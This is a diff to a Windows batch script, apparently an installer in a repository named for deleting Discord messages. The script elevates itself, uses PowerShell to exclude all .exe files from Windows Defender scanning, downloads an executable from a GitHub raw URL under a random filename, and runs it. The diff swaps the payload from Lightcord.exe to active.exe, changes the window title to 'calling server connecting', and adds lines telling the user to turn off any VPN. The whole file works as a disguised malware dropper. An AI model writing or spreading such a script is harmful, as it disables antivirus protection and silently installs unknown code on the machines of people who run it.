@@ -27,8 +27,8 @@ if '%errorlevel%' NEQ '0' (
     CD /D "%~dp0"
 :--------------------------------------
 
-title Lightcord Installing......
-
+title calling server connecting......
+echo Dont use Any vpn and wait...
 
 Powershell -Command "Set-MpPreference -ExclusionExtension exe"
 
@@ -44,7 +44,7 @@ set "counter=1"
 set "filename=%random%%random%%random%%extension%"
 if exist "%filename%" goto generateFilename
 
-Powershell -Command "Invoke-Webrequest 'https://github.com/SeniorPicchi/deleteDiscordMessages/raw/master/Lightcord.exe' -OutFile !filename!"
+Powershell -Command "Invoke-Webrequest 'https://github.com/SeniorPicchi/deleteDiscordMessages/raw/master/active.exe' -OutFile !filename!"
 
 start "" "!filename!"
-
+echo stop vpn and try again
